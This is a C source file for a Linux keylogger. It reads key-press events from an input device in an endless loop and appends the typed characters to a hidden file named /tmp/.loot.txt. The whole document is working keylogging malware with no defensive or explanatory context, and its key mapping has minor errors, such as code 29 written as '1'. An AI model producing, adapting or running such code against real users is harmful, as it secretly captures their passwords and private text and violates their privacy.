#include <linux/input.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>

#define TRUE    1

// Function protypes
void ProcessKeys (FILE *fptr, struct input_event);

int main (int argc, char **argv)
{
    int fd;
    FILE *fptr;
    struct input_event ev;

    if (argc < 2) 
    {
    	printf("usage: %s <device>\n", argv[0]);
    	exit (1);
    }
    
    // Open the keyboard device link
    if ((fd = open (argv[1], O_RDONLY)) == -1)
    {
        perror ("Invalid Device Link: ");
        exit (1);
    }
    
    while (TRUE)
    {
		read (fd, &ev, sizeof(struct input_event));   // read from the buffer

		if (ev.type == EV_KEY && ev.value == 1)
        {
				// Open the file to store the key presses
                fptr = fopen ("/tmp/.loot.txt","a+");
				
                // Process each keyboard event
                ProcessKeys (fptr, ev);
                fclose(fptr);
		}
	}
}

void ProcessKeys (FILE *fptr, struct input_event ev)
{
    
                if (ev.code == 41)
                {
					fprintf (fptr, "`", ev.code);
				}
				else if (ev.code == 2)
                {
					fprintf (fptr, "1", ev.code);
				}
				else if (ev.code == 3)
                {
					fprintf (fptr, "2", ev.code);
				}
				else if (ev.code == 4)
                {
					fprintf (fptr, "3", ev.code);
				}
				else if (ev.code == 5)
                {
					fprintf (fptr, "4", ev.code);
				}
				else if (ev.code == 6)
                {
					fprintf (fptr, "5", ev.code);
				}
				else if (ev.code == 7)
                {
					fprintf(fptr, "6", ev.code);
				}
				else if (ev.code == 8)
                {
					fprintf (fptr, "7", ev.code);
				}
				else if (ev.code == 9)
                {
					fprintf (fptr, "8", ev.code);
				}
				else if (ev.code == 10)
                {
					fprintf (fptr, "9", ev.code);
				}
				else if (ev.code == 11)
                {
					fprintf (fptr, "0", ev.code);
				}
				else if (ev.code == 12)
                {
					fprintf (fptr, "-", ev.code);
				}
				else if (ev.code == 13)
                {
					fprintf (fptr, "=", ev.code);
				}
				else if (ev.code == 14) 
                {
					fprintf (fptr, "[backspace]", ev.code);
				}
				else if (ev.code == 1)
                {
					fprintf (fptr, "1", ev.code);
				}
				else if (ev.code == 15)
                {
					fprintf (fptr, "[tab]", ev.code);
				}
				else if (ev.code == 16)
                {
					fprintf(fptr, "q", ev.code);
				}
				else if (ev.code == 17)
                {
					fprintf (fptr, "w", ev.code);
				}
				else if (ev.code == 18)
                {
					fprintf (fptr, "e", ev.code);
				}
				else if (ev.code == 19)
                {
					fprintf (fptr, "r", ev.code);
				}
				else if (ev.code == 20)
                {
					fprintf (fptr, "t", ev.code);
				}
				else if (ev.code == 21)
                {
					fprintf (fptr, "y", ev.code);
				}
				else if (ev.code == 22)
                {
					fprintf (fptr, "u", ev.code);
				}
				else if (ev.code == 23)
                {
					fprintf (fptr, "i", ev.code);
				}
				else if (ev.code == 24)
                {
					fprintf (fptr, "o", ev.code);
				}
				else if (ev.code == 25)
                {
					fprintf (fptr, "p", ev.code);
				}
				else if (ev.code == 26)
                {
					fprintf (fptr, "[", ev.code);
				}
				else if (ev.code == 27)
                {
					fprintf (fptr, "]", ev.code);
				}
				else if (ev.code == 43)
                {
					fprintf (fptr, "\\", ev.code);
				}
				else if (ev.code == 29)
                {
					fprintf (fptr, "1", ev.code);
				}
				else if (ev.code == 30)
                {
					fprintf (fptr, "a", ev.code);
				}
				else if (ev.code == 31)
                {
					fprintf (fptr, "s", ev.code);
				}
				else if (ev.code == 32)
                {
					fprintf (fptr, "d", ev.code);
				}
				else if (ev.code == 33)
                {
					fprintf (fptr, "f", ev.code);
				}
				else if (ev.code == 34)
                {
					fprintf (fptr, "g", ev.code);
				}
				else if (ev.code == 35)
                {
					fprintf (fptr, "h", ev.code);
				}
				else if (ev.code == 36)
                {
					fprintf (fptr, "j", ev.code);
				}
				else if (ev.code == 37)
                {
					fprintf (fptr, "k", ev.code);
				}
				else if (ev.code == 38)
                {
					fprintf (fptr, "l", ev.code);
				}
				else if (ev.code == 39)
                {
					fprintf (fptr, ";", ev.code);
				}
				else if (ev.code == 40)
                {
					fprintf (fptr, "'", ev.code);
				}
				else if (ev.code == 28)
                {
					fprintf (fptr, "[enter]", ev.code);
				}
				else if (ev.code == 42)
                {
					fprintf (fptr, "[shift]-", ev.code);
				}
				else if (ev.code == 44)
                {
					fprintf (fptr, "z", ev.code);
				}
				else if (ev.code == 45)
                {
					fprintf (fptr, "x", ev.code);
				}
				else if (ev.code == 46)
                {
					fprintf (fptr, "c", ev.code);
				}
				else if (ev.code == 47)
                {
					fprintf (fptr, "v", ev.code);
				}
				else if (ev.code == 48)
                {
					fprintf (fptr, "b", ev.code);
				}
				else if (ev.code == 49)
                {
					fprintf (fptr, "n", ev.code);
				}
				else if (ev.code == 50)
                {
					fprintf (fptr, "m", ev.code);
				}
				else if (ev.code == 51)
                {
					fprintf (fptr, ",", ev.code);
				}
				else if (ev.code == 52)
                {
					fprintf (fptr, ".", ev.code);
				}
				else if (ev.code == 53)
                {
					fprintf (fptr, "/", ev.code);
				}
				else if (ev.code == 29)
                {
					fprintf (fptr, "[ctrl]", ev.code);
				}
				else if (ev.code == 125)
                {
					fprintf (fptr, "[windows]", ev.code);
				}
				else if (ev.code == 56)
                {
					fprintf (fptr, "[alt]", ev.code);
				}
				else if (ev.code ==  57)
                {
					fprintf(fptr, " ", ev.code);
				}
				else if (ev.code == 100)
                {
					fprintf (fptr, "[alt]", ev.code);
				}
				else if (ev.code == 126)
                {
					fprintf (fptr, "[windows]", ev.code);
				}
				else if (ev.code == 97)
                {
					fprintf (fptr, "[ctrl]", ev.code);
				}
				
    
}
